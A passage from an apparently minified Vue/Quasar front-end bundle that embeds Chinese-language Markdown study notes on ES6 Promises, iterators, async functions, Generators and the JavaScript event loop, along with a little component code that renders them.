rejection)的别名，用于指定发生错误时的回调函数\r\n- Promise 对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止\r\n\r\n### Promise.prototype.finally()\r\n\r\n- finally方法用于指定不管 Promise 对象最后状态如何，都会执行的操作\r\n\r\n### Promise.all()\r\n\r\n- Promise.all方法用于将多个 Promise 实例，包装成一个新的 Promise 实例\r\n- （1）只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。\r\n- （2）只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。\r\n\r\n### Promise.race()\r\n\r\n- Promise.race方法同样是将多个 Promise 实例，包装成一个新的 Promise 实例\r\n- 只要其中之中有一个实例率先改变状态，状态就跟着改变\r\n\r\n### Promise.resolve()\r\n\r\n- 有时需要将现有对象转为 Promise 对象，Promise.resolve方法就起到这个作用\r\n- 参数是一个 Promise 实例\r\n- 参数是一个thenable对象\r\n- 参数不是具有then方法的对象，或根本就不是对象\r\n- 不带有任何参数\r\n\r\n### Promise.reject()\r\n\r\n- Promise.reject(reason)方法也会返回一个新的 Promise 实例，该实例的状态为rejected\r\n\r\n### 应用\r\n\r\n- 我们可以将图片的加载写成一个Promise，一旦加载完成，Promise的状态就发生变化。\r\n- 使用 Generator 函数管理流程，遇到异步操作的时候，通常返回一个Promise对象。\r\n\r\n### Promise.try()\r\n\r\n- Promise.try就是模拟try代码块，就像promise.catch模拟的是catch代码\r\n\r\n## Iterator 和 for...of 循环\r\n\r\n### Iterator（遍历器）的概念\r\n\r\n- 一种统一的接口机制，来处理所有不同的数据结构\r\n- 为各种不同的数据结构提供统一的访问机制。任何数据结构只要部署 Iterator 接口，就可以完成遍历操作\r\n- 一是为各种数据结构，提供一个统一的、简便的访问接口；\r\n- 二是使得数据结构的成员能够按某种次序排列；\r\n- 三是 ES6 创造了一种新的遍历命令for...of循环，Iterator 接口主要供for...of消费\r\n\r\n### 默认 Iterator 接口\r\n\r\n- Iterator 接口的目的，就是为所有数据结构，提供了一种统一的访问机制，即for...of循环\r\n- 一种数据结构只要部署了 Iterator 接口，我们就称这种数据结构是“可遍历的”\r\n\r\n### 调用 Iterator 接口的场合\r\n\r\n- 有一些场合会默认调用 Iterator 接口（即Symbol.iterator方法），除了下文会介绍的for...of循环，还有几个别的场合\r\n- 对数组和 Set 结构进行解构赋值时，会默认调用Symbol.iterator方法。\r\n- 扩展运算符（...）也会调用默认的 Iterator 接口。\r\n- yield*后面跟的是一个可遍历的结构，它会调用该结构的遍历器接口\r\n- for...of\r\n- Array.from()\r\n- Map(), Set(), WeakMap(), WeakSet()（比如new Map([['a',1],['b',2]])）\r\n- Promise.all()\r\n- Promise.race()\r\n\r\n### 字符串的 Iterator 接口\r\n\r\n- 字符串是一个类似数组的对象，也原生具有 Iterator 接口。\r\n\r\n### Iterator 接口与 Generator 函数\r\n\r\n- Symbol.iterator方法的最简单实现，还是使用下一章要介绍的 Generator 函数\r\n\r\n### 遍历器对象的 return()，throw()\r\n\r\n- 遍历器对象除了具有next方法，还可以具有return方法和throw方法\r\n- return方法的使用场合是，如果for...of循环提前退出\r\n- throw方法主要是配合 Generator 函数使用，一般的遍历器对象用不到这个方法\r\n\r\n### for...of 循环\r\n\r\n- 一个数据结构只要部署了Symbol.iterator属性，就被视为具有 iterator 接口，就可以用for...of循环遍历它的成员\r\n- for...of循环可以使用的范围包括数组、Set 和 Map 结构、某些类似数组的对象（比如arguments对象、DOM NodeList 对象）、后文的 Generator 对象，以及字符串\r\n\r\n## async 函数\r\n\r\n### 含义\r\n\r\n- async 函数是什么？一句话，它就是 Generator 函数的语法糖\r\n- 一比较就会发现，async函数就是将 Generator 函数的星号（*）替换成async，将yield替换成await，仅此而已\r\n- Generator 函数的执行必须靠执行器，所以才有了co模块，而async函数自带执行器\r\n- async和await，比起星号和yield，语义更清楚了\r\n- co模块约定，yield命令后面只能是 Thunk 函数或 Promise 对象，而async函数的await命令后面，可以是 Promise 对象和原始类型的值\r\n- async函数的返回值是 Promise 对象，这比 Generator 函数的返回值是 Iterator 对象方便多了\r\n\r\n### 基本用法\r\n\r\n- async函数返回一个 Promise 对象，可以使用then方法添加回调函数\r\n- 由于async函数返回的是 Promise 对象，可以作为await命令的参数\r\n\r\n### 语法\r\n\r\n- async函数的语法规则总体上比较简单，难点是错误处理机制。\r\n- async函数返回一个 Promise 对象。\r\n- async函数内部return语句返回的值，会成为then方法回调函数的参数\r\n- async函数返回的 Promise 对象，必须等到内部所有await命令后面的 Promise 对象执行完，才会发生状态改变，除非遇到return语句或者抛出错误\r\n- 正常情况下，await命令后面是一个 Promise 对象。如果不是，会被转成一个立即resolve的 Promise 对象\r\n- 如果await后面的异步操作出错，那么等同于async函数返回的 Promise 对象被reject\r\n- 如果有多个await命令，可以统一放在try...catch结构中\r\n\r\n### async 函数的实现原理\r\n\r\n- async 函数的实现原理，就是将 Generator 函数和自动执行器，包装在一个函数里\r\n\r\n## es6函数\r\n\r\n### 函数参数的默认值\r\n\r\n- 判断函数是否赋值是是否全等于undefined\r\n- 简洁，利于阅读，未来代码优化\r\n- 函数体里不能用let或const再次声明\r\n- 参数不能有同名参数\r\n- 不是传值，而是每次都重新计算默认值表达式的值\r\n- 应该是尾参数，非尾参数设置默认值，是没法省略的，除非显示指定undefined\r\n- 函数length属性会失真，rest和默认值参数，以及默认值之后的参数都将不被计算\r\n- 参数形成一个单独的作用域，不设置默认值是不出现。初始化结束后，作用域消失\r\n\r\n### rest参数（...变量名）\r\n\r\n- 是一个真实的参数\r\n- rest参数之后不能再有其他参数，否则报错\r\n- 函数的length属性不包括rest参数\r\n\r\n### 严格模式\r\n\r\n- 使用默认值，解构赋值、扩展运算符的函数内部都不能显示设定为严格模式否则会报错\r\n- 因为先执行函数参数再执行函数体，但是在函数体内才知道是否应该以严格模式执行\r\n- 解决办法\r\n\r\n\t- 全局使用严格模式\r\n\t- 将函数包含在严格模式的无参数立即执行函数里面\r\n\r\n### name属性\r\n\r\n- (new Function).name // \"anonymous\"\r\n- bind返回的函数，name属性值会加上bound前缀。\r\n\r\n### 箭头函数\r\n\r\n- 函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象\r\n- 不可以当作构造函数，不可以使用new命令，否则会抛出一个错误\r\n- 不可以使用arguments对象，该对象在函数体内不存在，如果要用可以使用rest参数代替\r\n- 不可以使用yield命令，因此箭头函数不能用作Generator函数\r\n- this在箭头函数中是固定的，并不是因为内部有绑定this的机制，实际原因是箭头函数根本没有自己的this\r\n- arguments、super、new.target也不存在箭头函数之中\r\n- 不能用call、apply、bind去改变this 的指向\r\n- 不适用在对象属性中使用箭头函数的this因为对象不构成单独的作用域\r\n- 不适用需要动态this的时候\r\n\r\n### 尾调用优化\r\n\r\n- 最后一步是调用另一个函数，另个函数不能用到这个函数的变量\r\n- 函数调用会在内存形成一个调用帧，保存调用位置和内部变量等信息，尾调用不需要保留外层函数的调用帧，取代外层函数调用帧，大大节省内存\r\n- 尾调用优化只在严格模式下开启，正常模式下无效\r\n- 因为正常模式下有这两个变量，可以跟踪函数的调用栈。\r\n\r\n\t- arguments\r\n\t- caller\r\n\r\n- 正常模式下可以使用蹦床函数实现优化\r\n\r\n### Function.prototype.toString()返回代码本身，明确要求返回一模一样的原始代码\r\n\r\n### catch命令的参数可以省略\r\n\r\n### es2017允许函数最后一个参数有逗号\r\n\r\n## Event Loop\r\n\r\n### 执行栈\r\n\r\n- JavaScript执行时，同步任务会排好队，在主程序上按照顺序执行，排队的地方叫做执行栈\r\n\r\n### 任务队列\r\n\r\n- JavaScript对异步任务不会停下来等待，而是将其挂起，继续执行执行栈中的同步任务，当异步任务有返回结果（通常是回调函数）时，异步任务会加入与执行栈不一样的队列，即任务队列\r\n- 微任务\r\n\r\n\t- promise.then\r\n\t- process.nextTick\r\n\r\n- 宏任务\r\n\r\n\t- script（整体代码）\r\n\t- setTimeout\r\n\t- setInterval\r\n\t- setImmediate\r\n\t- promise中的executor\r\n\r\n### Event执行顺序\r\n\r\n- 1.主程序\r\n- 2.微任务\r\n- 3.宏任务\r\n\r\n### async/await\r\n\r\n- 仅仅影响函数内的执行\r\n- await的下一个语句相当与执行promise.then\r\n\r\n### promise.then\r\n\r\n- 链式调用会被EventLoop中的其他事件插队\r\n- 分别调用不会，会将then中的回调函数push到一个数组后批量执行\r\n\r\n## Promise\r\n\r\n### Promise\r\n\r\n- 什么是Promise\r\n\r\n\t- Promise 的决议结果可能是拒绝而不是完成\r\n\t- Promise 封装了依赖于时间的状态——等待底层值的完成或拒绝\r\n\r\n- 具有 then 方法的鸭子类型\r\n\r\n\t- 在 Promise 系统中就会被误认为是一个 thenable, 这可能会导 致非常难以追踪的 bug\r\n\t- 这种 类型检查 (type check)一般用术语 鸭子类型 (duck typing)来表示\r\n\t- 对象上有 then(..) 函数，或则他的原型上有 then()函数\r\n\r\n- Promise 信任问题\r\n\r\n\t- 对一个 Promise 调用 then(..) 的时候, 即使这个 Promise 已经决议, 提供给 then(..) 的回调也总会被异步调用\r\n\t- 一个 Promise 决议后, 这个 Promise 上所有的通过 then(..) 注册的回调都会在下一个异步时机点上依次被立即调用\r\n\t-  两个独立Promise 上链接的回调的相对顺序无法可靠预测\r\n\t- 如果 Promise 本身永远不被决议呢，Promise 提供了一个方案：有一个输出信号,防止其永久挂住程序\r\n\t- Promise 的定义方式使得它只能被决议一次\r\n\t- Promise 至多只能有一个决议值(完成或拒绝)\r\n\t- 如果使用多个参数调用 resovle(..) 或者 reject(..) ,第一个参数之 后的所有参数都会被默默忽略\r\n\t- 如果拒绝一个 Promise 并给出一个理由，这个值就会被传给拒绝回调\r\n\t- 如果在 Promise 的创建过程中或在查看其决议 结果过程中的任何时间点上出现了一个 JavaScript 异常错误\r\n\t- 如果向 Promise.resolve(..) 传递一个非 Promise、非 thenable 的立即值,就会得到一个用 这个值填充的 promise\r\n\t- Promise这种模式通过可信任的语义把回调作为参数传递，把控制权放在了一个可信任的系统\r\n\r\n- 链式流\r\n\r\n\t- 我们可以把多个 Promise 连接到一起以表示一系列异步 步骤\r\n\t- Promise 规范化了异步, 并封装了时间相关值的状态,使得我们能够把它们以这种有用的方式链接到一起\r\n\t- 调用Promise的then(..)会自动创建一个新的 Promise 从调用返回\r\n\t- 在完成或拒绝处理函数内部,如果返回一个值或抛出一个异常,新返回的(可链接的)\r\n\r\nPromise 就相应地决议\r\n\t- 如果完成或拒绝处理函数返回一个 值是什么,都会成为当前 then(..)\r\n\r\nPromise, 它将会被展开,这样一来,不管它的决议 返回的链接 Promise 的决议值\r\n\t- 术语 决议 (resolve)、 完成 (fulfill)和 拒绝 (reject),\r\n\r\n- 错误处理\r\n\r\n\t- try..catch 当然很好, 但是无法跨异步操作工作\r\n\t- 模式化的错误处理方式，error-first 回调 风格\r\n\t-  Promise 没有采用 流行的 error-first 回调设计风格,而是使用了分离回调(split-callback)风格。\r\n\t- Promise 错误处理就是一个“绝望的陷阱”设计，它假定你想要 Promise 状态吞掉所有的错误\r\n\t- 浏览器在它被垃圾回收的时候 其中有拒绝,浏览器就能够确保这是一个真正的未捕获错误,进而可以确定应该将其报告 到开发者终端\r\n\t- 如果一个 Promise 被拒绝的话,默认情况下会向开发者终端报告这个事实\r\n\t- 需要等待一段时间才能使用或查看它的拒绝结果, 调用 defer() , 这样就不会有全局报告出现\r\n\r\n- Promise 模式\r\n\r\n\t- 并行执行   Promise.all([ .. ])\r\n\t- 如果这些 promise 中有任何一个被拒绝的话,主 Promise.all([ .. ]) promise 就会立 即被拒绝,并丢弃来自其他所有 promise 的全部结果\r\n\t- “第一个跨过终点线的 Promise” ,而抛弃其他 Promise\r\n\t- 一旦有任何一个 Promise 决议为完成, 就会完成;一旦有任何一个 Promise 决议为拒绝,它就会拒绝。\r\n\t- none([ .. ]) 这个模式类似于 all([ .. ]) ,不过完成和拒绝的情况互换了。所有的 拒绝,即拒绝转化为完成值,反之亦然。\r\n\t- any([ .. ]) Promise 都要被 这个模式与 all([ .. ]) 类似,但是会忽略拒绝,所以只需要完成一个而不是全部\r\n\t- first([ .. ]) 这个模式类似于与 any([ .. 的任何拒绝和完成。\r\n\t- last([ .. ]) 这个模式类似于 first([ .. ]) ,但却是只有最后一个完成胜出\r\n\t- 有些时候会需要在一列 Promise 中迭代, 并对所有 Promise 都执行某个任务,并发迭代，map()\r\n\r\n- Promise API 概述\r\n\r\n\t- new Promise(..) 构造器,接受两个参数，reject(..) 就是拒绝这个 promise;但 resolve(..) 既可能完成 promise\r\n\t- Promise.resolve(..) 和 Promise.reject(..)\r\n\t- then(..) 和 catch(..)\r\n\r\n\t\t- then(..) 接受一个或两个参数:第一个用于完成回调,第二个用于拒绝回调\r\n\t\t- catch(..) 只接受一个拒绝回调作为参数,并自动替换默认完成 回调\r\n\r\n\t- Promise.all([ .. ]) 和 Promise.race([ .. ])\r\n\r\n\t\t- 对 Promise.all([ .. ]) 来说,只有传入的所有 promise 都完成,返回 promise 才能完成\r\n\t\t- 对 Promise.race([ .. ]) 来说,只有第一个决议的 promise(完成或拒绝)取胜, \r\n并且其 决议结果成为返回 promise 的决议。\r\n\r\n- Promise 局限性\r\n\r\n\t-  顺序错误处理\r\n\r\n\t\t- 即 Promise 链中的错误很容易被 无意中默默忽略掉\r\n\t\t- 没有把整个链标识为一个个体的实体,这意味着没有外部方法可以用于观 察可能发生的错误\r\n\r\n\t- 单一值\r\n\r\n\t\t- Promise 只能有一个完成值或一个拒绝理由\r\n\r\n\t- 单决议\r\n\r\n\t\t- :Promise 只能被决议一次(完成或拒绝)\r\n\r\n\t- 惯性\r\n\r\n\t\t- 开发者需要刻意的改变编程习惯,因为 Promise 不会从目前的编码方式中自 然而然地衍生出来\r\n\r\n\t- 无法取消的 Promise\r\n\r\n\t\t- 一旦创建了一个 Promise 并为其注册了完成和 / 或拒绝处理函数,如果出现某种情况使得 这个任务悬而未决的话,\r\n你也没有办法从外部停止它的进程\r\n\r\n\t- Promise 性能\r\n\r\n\t\t- Promise 进行的动作要多一些,这自然意味着它也会稍慢一些。\r\n\r\n### Promise\r\n\r\n- 特点\r\n\r\n\t- 对象状态不受外界影响，只有异步操作的结果可以决定当前的状态\r\n\r\n\t\t- pending\r\n\t\t- fulfilled\r\n\t\t- rejected\r\n\r\n\t- 状态一旦改变，就不会再变\r\n\t- 无法取消Promise，一旦新建就立即执行\r\n\t- 如果不设置回调函数，内部抛出的错误无法反应到外部\r\n\t- 处于pending时，无法得知目前进展到哪一个阶段了（刚刚开始还是即将完成）\r\n\r\n- 含义\r\n\r\n\t- 是一个对象/容器，保存某个未来才会结束事件的结果\r\n\r\n- 基础用法\r\n\r\n\t- new Promise时，需要传递一个executor执行器，执行器立即执行\r\n\t- executor接收两个参数，分别是resolve和reject\r\n\t- promise只能从pending到rejected或者从pending到fulfilled\r\n\t- promise的状态一旦确认，就不会再改变\r\n\t- reject方法的作用，等同于抛出错误\r\n\r\n- then\r\n\r\n\t- 定义在Promise.prototype上\r\n\t- 接收两个参数（可以缺省）\r\n\r\n\t\t- promise成功的回调\r\n\t\t- promise失败的回调\r\n\r\n\t- 如果调用then时，promise已经成功，则执行成功的回调函数，并将promise的值作为参数传递进去\r\n\t- 如果调用then时，promise已经失败，则执行失败的回调函数，并将promise失败的原因作为参数传递进去\r\n\t- 如果promise的状态是pending，则将两个回调函数存放起来，等待状态确定后，再一次将对应的函数执行（发布订阅）\r\n\t- promise可以then多次，promise的then返回一个promise \r\n\t- 如果then返回的是一个结果，那么就会把这个结果作为参数传递给下一个then的成功回调函数\r\n\t- 如果then中抛出了异常，那么就会把这个异常作为参数，传递给下一个then的失败回调函数\r\n\t- 如果then返回的是一个promise，那么需要等待这个promise执行完，如果promise返回成功则进入下一个then的成功，如果失败，就进入下个个then的失败\r\n\r\n- then与catch返回值return不能是promise本身，否则会造成死循环\r\n- catch\r\n\r\n\t- 定义在Promise.prototype上，用于指定发生错误时的回调函数\r\n\t- 如果catch之前的promise抛错错误（包括catch之前的then抛出错误也会被捕获）那么状态就会变为rejected，就会调用catch指定的回调函数，处理这个错误\r\n\t- reject方法的作用，等同于抛出错误\r\n\t- resolve之后再抛出错误是无效的，因为状态一旦改变，变不会再变\r\n\t- Promise对象的错误具有冒泡性质，会一直向后传递，直到被捕获位置\r\n\t- 一般不在then方法里面定义reject状态的回调函数，而是在then的外面使用catch，这样可以捕获then执行中的错误\r\n\t- 如果没有catch方法则promise对象抛出的错误不会传递到外层代码，即不会有任何的反应\r\n\t- catch后接then方法，如果没有抛出错误则会跳过catch直接执行then\r\n\t- catch方法后还可以调用catch\r\n\r\n- finally\r\n\r\n\t- 定义在Promise.prototype上，无论Promise的状态如何，都会执行（es2018）\r\n\t- 不依赖Promise的执行结果，所以不就受任何参数\r\n\r\n- Promise.all()\r\n\r\n\t- 构造函数上的方法，用来将多个Promise的实例，包装成一个新的Promise的实例\r\n\t- 接收（一般为数组）一个具有Iterator接口的参数，参数返回成员都是Promise的实例\r\n\t- 如果参数不是Promise的实例，则会调用Primise.resolve方法，将参数转为Promise的实例\r\n\t- 只有参数实例的状态都变成fulfilled，状态才会变成fulfilled，此时参数的返回值组成一个数组传给实例的回调函数\r\n\t- 只要参数实例有一个状态变成rejected，实例状态就会变成rejected，此时第一个被rejected的参数实例的返回值就会传递给实例的回调函数\r\n\t- 参数实例中有catch方法且执行了的话，该参数实例会变成resolved，Promise.all()的catch方法也不会被执行\r\n\r\n- Promise.race()\r\n\r\n\t- 参数与Promise.all()一样，如果不是Promise实例则会调用Promise.resolve\r\n\t- 只要参数实例之中有一个实例率先改变状态则实例状态就跟着改变，率先改变的参数实例的返回值会传递给实例的回调函数\r\n\r\n- Promise.resolve()\r\n\r\n\t- 将现有对象转为Promise对象\r\n\t- 等价于 new Promise（resolve=>resolve('foo')）\r\n\t- 参数是一个Promise的实例则不做任何修改，原封不动的返回实例\r\n\t- 参数是一个thenable的对象（具有then方法的对象），会将这个对象转为Promise对象，然后立即执行thenable对象的then 方法\r\n\t- 参数不是thenable对象或者不是对象，则返回一个新的Promise对象状态为resolved，Promise.reolved方法的参数会同时传给回调函数\r\n\t- 不带参数，直接返回一个resolved状态的对象，在本轮事件循环结束时执行\r\n\r\n- Promise.reject()\r\n\r\n\t- 返回一个Promise实例，状态为rejected\r\n\t- 参数会原封不动的作为rejected的理由，变成后续方法的参数（不会立即执行thenable对象的then方法）\r\n\r\n- Promise.try()\r\n\r\n\t- 现有的提案还未通过，同步函数同步执行，异步函数异步执行。\r\n\t- 也可以使用立即执行函数里面使用async或者Promise实现\r\n\r\n## Generator\r\n\r\n### Generator\r\n\r\n- 概念\r\n\r\n\t- Generator函数是一个状态机，封装了多个内部状态\r\n\t- 返回一个遍历器对象代表函数的内部指针，可以一次遍历Generator函数内部的每个状态\r\n\t- function与函数名之间有星号*，内部使用yield表达式\r\n\t- yield是暂停执行的标志，next方法可以恢复执行\r\n\t- next()方法返回带有value、done属性的对象\r\n\t- 将Generator赋值给对象的Symbol.iterator属性，从而使对象具有iterator接口\r\n\t- for...of循环可以自动遍历Generator函数运行时生成的iterator对象。\r\n\t- 不是构造函数，所以实例对象拿不到this上的属性，函数绑定在对象上面时候可以使用this：F.call(obj)，两个对象统一的实现是F.call(F.prototype)\r\n\r\n- yield\r\n\r\n\t-  遇到yield表达式，暂停执行后面的操作，yield后面的表达式的值作为返回对象的value属性的值\r\n\t- 下一次掉用next方法再继续往下执行，直到遇到下一个yield表达式\r\n\t- 如果没有yield表达式，就一直运行到函数结束，一直到return\r\n\t- 如果没有return则返回对象的value属性值为undefined\r\n\t- next方法可以带一个参数，该参数就会被当作上一个yield表达式的返回值\r\n\t- yield在另一个表达式中必须用圆括号括起来\r\n\r\n- throw\r\n\r\n\t- 每个Generator函数返回的遍历对象都有一个throw方法，可以再函数体外抛出错误，然后再Generator函数体内捕获\r\n\t- 可以接受一个参数，会被catch语句接收，建议抛出Error对象的实例\r\n\t- 如果Generator函数内部没有部署try...catch那么会被外部的try...catch代码块捕获\r\n\t- 如果外部和内部都没有部署try...catch代码块，那么程序会报错，直接中断执行\r\n\t- 如果错误要被捕获，generator对象必须至少执行过一次next方法\r\n\t- 第一次next方法相当于启动执行generator函数的内部代码\r\n\t- throw方法被捕获后，会附带执行下一条的yield表达式，也就是会附带执行一次next方法\r\n\r\n- return\r\n\r\n\t- 可以返回给定的值，并且终结遍历Generator函数\r\n\t- 如果函数内部有try...finally代码块，且正在执行try代码块，那么return会推迟到finally代码块执行完再执行\r\n\t- return、next、throw都是让Generator函数恢复执行，并且使用不同的语句替换yield表达式\r\n\r\n- yield*\r\n\r\n\t- 用来在一个Generator函数里面执行另一个Generator函数，会自动遍历，如果不带星只会返回遍历器对象\r\n\t- 等同于部署了一个for...of循环，会自动遍历有Iterator的对象，比如数组\r\n\r\n- 上下文\r\n\r\n\t- 一般代码运行会产生一个全局上下文环境（context，又称运行环境），包含了当前所有的变量和对象，执行代码是又会在当前上下文环境的上层产生一个运行的上下文，变成当前的上下文，由此形成上下文环境的堆栈，最后产生的上下文环境首先执行完成，退出堆栈，然后在执行完成它下层的上下文，直至所有代码执行完成，堆栈清空\r\n\t- 而Generator函数的上下文一旦遇到yield就会暂时退出堆栈，里面的所有变量和对象会冻结在当前状态，等到next是，上下文环境会重新加入调用栈，冻结的变量和对象恢复执行\r\n\r\n- 协程\r\n\r\n\t- 可以并行执行、交换执行权的线程就称为协程\r\n\t- 子例程只有当前调用子函数完全执行完毕，才会结束执行父函数\r\n\t- Generator函数属于半协程，如果是完全执行的协程，那么任何函数都可以让暂停的协程继续执行\r\n\t- 普通线程是抢先式的，优先由运行环境决定，协程式合作式的，执行权由协程自己分配\r\n\t- 协程好处就是抛出错误的时候可以找到原始的调用栈。\r\n\r\n- 应用\r\n\r\n\t- 异步操作的同步化表达\r\n\t- 状态机\r\n\t- 控制流管理\r\n\t- 部署Iterator接口\r\n\t- 作为数据结构\r\n\r\n- 异步应用\r\n\r\n\t- 传统方法\r\n\r\n\t\t- 回调函数\r\n\t\t- 事件监听\r\n\t\t- 发布/订阅\r\n\r\n\t- 异步\r\n\r\n\t\t- 一个任务不连续完成\r\n\t\t- 先执行第一段，然后转而执行其他任务，等做好了准备在回过头执行第二段\r\n\t\t- 回调函数就是将任务的第二段单独写在一个函数里\r\n\t\t- Promise最大问题是代码冗余\r\n\r\n\t- 协程\r\n\r\n\t\t- 异步任务是A协程\r\n\t\t- 协程A开始执行\r\n\t\t- 协程A执行到一半，进入暂停，执行权转移到协程B\r\n\t\t- 一段时间后，协程B交还执行权\r\n\t\t- 协程A恢复执行\r\n\r\n\t- Thunk函数\r\n\r\n\t\t- 是自动执行Generator函数的一种方法\r\n\t\t- 实现传名调用，即参数用到的时候才求值\r\n\t\t- 将多参数函数替换成一个只接受回调函数作为参数的单参数函数\r\n\r\n### Generator 函数的异步应用\r\n\r\n- 传统方法\r\n\r\n\t- 回调函数\r\n\t- 事件监听\r\n\t- 发布/订阅\r\n\t- Promise 对象\r\n\r\n- 基本概念\r\n\r\n\t- 所谓\"异步\"，简单说就是一个任务不是连续完成的，可以理解成该任务被人为分成两段，先执行第一段，然后转而执行其他任务，等做好了准备，再回过头执行第二段\r\n\t- 所谓回调函数，就是把任务的第二段单独写在一个函数里面，等到重新执行这个任务的时候，就直接调用这个函数\r\n\t- Promise 对象是一种新的写法，允许将回调函数的嵌套，改成链式调用\r\n\r\n- Generator 函数\r\n\r\n\t- 第一步，协程A开始执行。\r\n\t- 第二步，协程A执行到一半，进入暂停，执行权转移到协程B。\r\n\t- 第三步，（一段时间后）协程B交还执行权。\r\n\t- 第四步，协程A恢复执行。\r\n\t- Generator 函数是协程在 ES6 的实现，最大特点就是可以交出函数的执行权（即暂停执行）\r\n\t- Generator 函数可以暂停执行和恢复执行，这是它能封装异步任务的根本原因\r\n\r\n- Thunk 函数\r\n\r\n\t- Thunk 函数是自动执行 Generator 函数的一种方法\r\n\t- Thunk 函数的定义，它是“传名调用”的一种实现策略，用来替换某个表达式\r\n\t- 生产环境的转换器，建议使用 Thunkify 模块\r\n\r\n- co 模块\r\n\r\n\t- co 模块可以让你不用编写 Generator 函数的执行器\r\n\t- （1）回调函数。将异步操作包装成 Thunk 函数，在回调函数里面交回执行权。\r\n\t- （2）Promise 对象。将异步操作包装成 Promise 对象，用then方法交回执行权。\r\n\r\n### Generator 函数的语法\r\n\r\n- 简介\r\n\r\n\t- Generator 函数是 ES6 提供的一种异步编程解决方案，语法行为与传统函数完全不同\r\n\t- 语法上，首先可以把它理解成，Generator 函数是一个状态机，封装了多个内部状态\r\n\t- 执行 Generator 函数会返回一个遍历器对象，也就是说，Generator 函数除了状态机，还是一个遍历器对象生成函数\r\n\t- 一是，function关键字与函数名之间有一个星号\r\n\t- 二是，函数体内部使用yield表达式，定义不同的内部状态\r\n\t- 总结一下，调用 Generator 函数，返回一个遍历器对象，代表 Generator 函数的内部指针。以后，每次调用遍历器对象的next方法，就会返回一个有着value和done两个属性的对象\r\n\r\n- next 方法的参数\r\n\r\n\t- yield表达式本身没有返回值，或者说总是返回undefined。next方法可以带一个参数，该参数就会被当作上一个yield表达式的返回值\r\n\t- 由于next方法的参数表示上一个yield表达式的返回值，所以在第一次使用next方法时，传递参数是无效的\r\n\t- 如果想要第一次调用next方法时，就能够输入值，可以在 Generator 函数外面再包一层\r\n\r\n- for...of 循环\r\n\r\n\t- for...of循环可以自动遍历 Generator 函数时生成的Iterator对象，且此时不再需要调用next方法\r\n\t- 利用for...of循环，可以写出遍历任意对象（object）的方法\r\n\r\n- Generator.prototype.throw()\r\n\r\n\t- Generator 函数返回的遍历器对象，都有一个throw方法，可以在函数体外抛出错误，然后在 Generator 函数体内捕获\r\n\t- 不要混淆遍历器对象的throw方法和全局的throw命令\r\n\t- throw方法抛出的错误要被内部捕获，前提是必须至少执行过一次next方法\r\n\r\n- Generator.prototype.return()\r\n\r\n\t- Generator 函数返回的遍历器对象，还有一个return方法，可以返回给定的值，并且终结遍历 Generator 函数\r\n\t- 如果return方法调用时，不提供参数，则返回值的value属性为undefined\r\n\t- Generator 函数内部有try...finally代码块，那么return方法会推迟到finally代码块执行完再执行\r\n\r\n- next()、throw()、return() 的共同点\r\n\r\n\t- 它们的作用都是让 Generator 函数恢复执行，并且使用不同的语句替换yield表达式\r\n\t- next()是将yield表达式替换成一个值。\r\n\t- throw()是将yield表达式替换成一个throw语句\r\n\t- return()是将yield表达式替换成一个return语句\r\n\r\n- yield* 表达式\r\n\r\n\t- 如果在 Generator 函数内部，调用另一个 Generator 函数，默认情况下是没有效果的\r\n\t- 用到yield*表达式，用来在一个 Generator 函数里面执行另一个 Generator 函数\r\n\t- 任何数据结构只要有 Iterator 接口，就可以被yield*遍历\r\n\r\n- 作为对象属性的 Generator 函数\r\n\r\n\t- 属性前面有一个星号，表示这个属性是一个 Generator 函数\r\n\r\n- Generator 函数的this\r\n\r\n\t- Generator 函数也不能跟new命令一起用，会报错\r\n\t- 生成一个空对象，使用call方法绑定 Generator 函数内部的this\r\n\r\n- 含义\r\n\r\n\t- Generator 是实现状态机的最佳结构\r\n\t- 。Generator 函数被称为“半协程”（semi-coroutine），意思是只有 Generator 函数的调用者，才能将程序的执行权还给 Generator 函数\r\n\t- Generator 执行产生的上下文环境，一旦遇到yield命令，就会暂时退出堆栈，但是并不消失，里面的所有变量和对象会冻结在当前状态\r\n\r\n- 应用\r\n\r\n\t- Generator 可以暂停函数执行，返回任意表达式的值\r\n\r\n",st={data:function(){return{MainComponent:it}}},ot=st,lt=Object(u["a"])(ot,et,at,!1,null,"5bf07dd8",null),ct=lt.exports,pt=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},ut=[],mt="# es62\r\n\r\n## Iterator 和 for...of 循环\r\n\r\n### JS表示“集合”的数据结构\r\n\r\n- 数组（Array）\r\n- 对象（Object）\r\n- Map\r\n- Set\r\n\r\n### 遍历器（Iterator）是一种接口，为各种不同的数据结构提供统一的访问机制。\r\n\r\n- Iterator 的作用\r\n\r\n\t- 一是为各种数据结构，提供一个统一的、简便的访问接口；\r\n\t- 二是使得数据结构的成员能够按某种次序排列；\r\n\t- 三是 ES6 创造了一种新的遍历命令for...of循环，Iterator 接口主要供for...of消费\r\n\r\n- 遍历过程\r\n\r\n\t- （1）创建一个指针对象，指向当前数据结构的起始位置。也就是说，遍历器对象本质上，就是一个指针对象。\r\n\t- （2）第一次调用指针对象的next方法，可以将指针指向数据结构的第一个成员。\r\n\t- （3）第二次调用指针对象的next方法，指针就指向数据结构的第二个成员。\r\n\t- （4）不断调用指针对象的next方法，直到它指向数据结构的结束位置。\r\n\t- 每一次调用next方法，都会返回数据结构的当前成员的信息。具体来说，就是返回一个包含value和done两个属性的对象。其中，value属性是当前成员的值，done属性是一个布尔值，表示遍历是否结束。\r\n\r\n### 默认 Iterator 接口\r\n\r\n- ES6 规定，默认的 Iterator 接口部署在数据结构的Symbol.iterator属性\r\n\r\n\t- Symbol.iterator属性本身是一个函数，就是当前数据结构默认的遍历器生成函数。执行这个函数，就会返回一个遍历器。至于属性名Symbol.iterator，它是一个表达式，返回Symbol对象的iterator属性，这是一个预定义好的、类型为 Symbol 的特殊值，所以要放在方括号内（参见《Symbol》一章）。\r\n\r\n\t\t- const obj = {\r\n  [Symbol.iterator] : function () {\r\n    return {\r\n      next: function () {\r\n        return {\r\n          value: 1,\r\n          done: true\r\n        };\r\n      }\r\n    };\r\n  }\r\n};\r\n\r\n### 原生具备 Iterator 接口的数据结构如下。\r\n\r\n- Array\r\n\r\n\t- 